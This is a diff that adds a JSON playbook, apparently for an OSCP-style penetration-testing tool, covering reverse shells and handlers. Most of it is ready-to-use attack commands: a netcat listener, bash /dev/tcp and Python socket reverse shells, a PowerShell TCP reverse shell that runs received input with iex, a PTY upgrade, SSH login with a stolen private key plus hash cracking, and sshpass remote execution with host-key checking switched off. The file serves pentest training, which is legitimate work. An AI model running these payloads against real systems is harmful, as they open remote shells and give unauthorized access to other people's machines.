@@ -1,0 +1,118 @@
+{
+  "name": "Reverse shells & handlers (§3)",
+  "description": "Once a foothold or command-execution path exists, catch and stabilise an interactive shell: stand up a listener, craft a reverse-shell payload for the target OS, then upgrade to a full PTY. Payloads are only crafted and handed to the operator — never auto-fired, an OSCP requirement; the listener runs locally.",
+  "source": "OSCP methodology (project-authored, obol-local)",
+  "actions": [
+    {
+      "id": "shell-listener",
+      "title": "Start a reverse-shell listener",
+      "hypothesis": "Any reverse-shell payload needs a listener already waiting on your LHOST to catch the callback before it fires.",
+      "tool": "nc",
+      "tools": ["nc", "ncat", "rlwrap", "penelope"],
+      "requires_any": ["web.cmdi_confirmed", "foothold.linux", "foothold.windows", "exploit.candidate"],
+      "produces": ["listener.open"],
+      "priority": 70,
+      "autonomy": "approve",
+      "proves": "a listener bound and ready to catch a reverse shell",
+      "does_not_prove": "a caught shell — nothing lands until a callback actually connects",
+      "commands": [
+        {"tool": "rlwrap", "run": "rlwrap nc -lvnp 4444"},
+        {"tool": "penelope", "run": "penelope 4444"}
+      ]
+    },
+    {
+      "id": "shell-revshell-linux",
+      "title": "Linux reverse-shell payload",
+      "hypothesis": "A confirmed command-execution primitive on a Linux target becomes an interactive shell by firing a bash or python callback back to your listener.",
+      "tool": "bash",
+      "tools": ["bash", "python3", "nc"],
+      "requires_any": ["listener.open", "web.cmdi_confirmed"],
+      "produces": ["access.shell"],
+      "priority": 62,
+      "autonomy": "manual",
+      "proves": "an interactive shell on the Linux target (once caught)",
+      "does_not_prove": "privileged access — the shell arrives as the exploited service's user, nothing more",
+      "refs": ["https://www.revshells.com/"],
+      "commands": [
+        {"tool": "bash", "run": "bash -c 'bash -i >& /dev/tcp/{{lhost}}/4444 0>&1'"},
+        {"tool": "python3", "run": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{lhost}}\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"}
+      ]
+    },
+    {
+      "id": "shell-revshell-windows",
+      "title": "Windows reverse-shell payload",
+      "hypothesis": "A command-execution primitive on Windows becomes a shell via a PowerShell or nc.exe callback back to your listener.",
+      "tool": "powershell",
+      "tools": ["powershell", "nc.exe"],
+      "requires_any": ["listener.open", "web.cmdi_confirmed", "foothold.windows"],
+      "produces": ["access.shell"],
+      "priority": 60,
+      "autonomy": "manual",
+      "proves": "an interactive shell on the Windows target (once caught)",
+      "does_not_prove": "administrator or SYSTEM — the shell arrives as the exploited process's user",
+      "refs": ["https://www.revshells.com/"],
+      "commands": [
+        {"tool": "powershell", "run": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{lhost}}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.ASCIIEncoding]::UTF8.GetBytes($r)),0,$r.Length)}\""}
+      ]
+    },
+    {
+      "id": "shell-pty-upgrade",
+      "title": "Upgrade a dumb shell to a full PTY",
+      "hypothesis": "A freshly caught reverse shell is line-buffered and drops Ctrl-C and arrow keys; upgrading it to a PTY gives a real terminal, which su, sudo, and vim all need.",
+      "tool": "python3",
+      "tools": ["python3", "script", "stty"],
+      "requires_any": ["access.shell"],
+      "produces": [],
+      "priority": 58,
+      "autonomy": "manual",
+      "proves": "a fully-interactive TTY on the target",
+      "does_not_prove": "any new access — it only stabilises the shell you already hold",
+      "refs": ["https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"],
+      "commands": [
+        {"tool": "python3", "run": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm"}
+      ]
+    },
+    {
+      "id": "ssh-key-login",
+      "title": "Log in over SSH with a recovered private key",
+      "hypothesis": "A PEM private key recovered from loot (LFI, a backup, a readable home, a git-dump) is a foothold when SSH is reachable — save it, tighten its permissions, and log in. The username is the piece to determine (the key's path/comment, an enumerated user, or the box's theme).",
+      "tool": "ssh",
+      "tools": ["ssh"],
+      "requires_all": ["ssh.reachable"],
+      "requires_any": ["credential.certificate"],
+      "produces": [],
+      "priority": 66,
+      "autonomy": "approve",
+      "proves": "an interactive SSH session as the key's owner (an id/whoami confirms the identity)",
+      "does_not_prove": "which user the key belongs to until a login succeeds, nor any privilege beyond that user",
+      "refs": ["https://gtfobins.github.io/", "https://man.openbsd.org/ssh"],
+      "commands": [
+        {"tool": "ssh", "run": "chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no <user>@{{target}}",
+         "note": "save the recovered key to id_rsa first; try likely usernames (key comment, enumerated users, root). An encrypted key (ENCRYPTED header) → ssh2john id_rsa > k.hash && hashcat/john it, then unlock."}
+      ]
+    },
+    {
+      "id": "linux-remote-exec",
+      "title": "Authenticated Remote Command (SSH)",
+      "hypothesis": "With a Linux credential (a password or a private key) and SSH reachable, you can run any command on the box without holding an interactive session — enumerate, hunt privesc, grab flags. The web crafter's Linux 'run on host' menu fills {{command}} (id, sudo -l, SUID find…) and you edit it freely.",
+      "tool": "sshpass",
+      "tools": ["sshpass", "ssh"],
+      "os": ["linux"],
+      "requires_all": ["ssh.reachable"],
+      "requires_any": ["credential.available", "credential.certificate", "foothold.linux"],
+      "produces": ["foothold.linux", "access.shell"],
+      "priority": 72,
+      "autonomy": "manual",
+      "proves": "command execution on the Linux host as the authenticating user (an id confirms it)",
+      "does_not_prove": "any privilege beyond that user until a privesc is demonstrated on its own",
+      "report": {"finding": "Authenticated Access via Exposed Credentials", "severity": "high"},
+      "refs": ["https://gtfobins.github.io/", "https://man.openbsd.org/ssh"],
+      "commands": [
+        {"tool": "sshpass", "run": "sshpass -p '{{password}}' ssh -o StrictHostKeyChecking=no {{user}}@{{target}} '{{command}}'",
+         "note": "Password auth — runs one command and returns. String several with ';' inside the quotes."},
+        {"tool": "ssh", "run": "ssh -i id_rsa -o StrictHostKeyChecking=no {{user}}@{{target}} '{{command}}'",
+         "note": "Key auth — save the recovered private key to id_rsa first."}
+      ]
+    }
+  ]
+}
